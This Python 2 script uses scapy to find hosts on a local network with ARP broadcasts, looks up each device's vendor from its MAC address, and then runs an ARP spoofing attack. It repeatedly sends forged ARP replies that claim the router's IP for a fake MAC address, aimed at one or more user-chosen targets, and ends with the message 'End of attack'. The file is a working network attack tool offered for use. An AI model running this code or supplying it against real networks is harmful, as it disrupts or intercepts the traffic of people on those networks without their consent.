#! /usr/bin/env python
# -*- coding: utf-8 -*-

import datetime
from scapy.all import *
import urllib2 as urllib


def scanning(iface, ips):
    """Scan the network in order to find all devices"""

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    print ("\n[*] Scanning ...\n")
    start_scan = datetime.now()
    conf.verb = 0
    try:
        ans, unans = sr(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ips), iface=iface, timeout=0.5, inter=0.1)

    except :
        print("[!] No such device : "+iface)
        print('[!] Or')
        print("[!] Range of IP not known : "+ips)
        exit(0)

    try:
        for s,r in ans:
            dstmac = (r[Ether].src)
            vendor = resolveMac(dstmac)
            print (r.sprintf(r"%Ether.src% - %ARP.psrc%" + "   "+ vendor))
    except Exception as Err:
        print (Err)

    stop_scan = datetime.now()
    print ("\n[*] Scan completed")
    time_scan = stop_scan - start_scan
    print ("[*] Scan duration : %s" %(time_scan))


def resolveMac(mac):
    """Find constructor thanks to Mac address"""
    try:
        url = "http://api.macvendors.com/"+str(mac)
        response = urllib.urlopen(url)
        vendor = response.read()
    except:
        vendor = "N/A"

    return vendor


def spoofing(attackmode, downtime):
    target = ['None']

    if attackmode == 1:
        print ('choose 1 ip')
        newtarget = raw_input('')
        target.append(newtarget)
    if attackmode == 2:
        print ('choose multiple ip (separate with ,)')
        newtarget = raw_input("")
        for t in newtarget.split(','):
            target.append(t)

    print ('Enter the router ip :')
    router = raw_input("")
    now = 0

    while now < downtime:
        for i in target:
            if i != 'None':
                monArp = (ARP(psrc=router, pdst=i, hwsrc='AA:94:c2:db:f2:22', op=2))  # Spoof mac enable
                send(monArp)

        now = now + 1

        time.sleep(1)
    print ('End of attack')
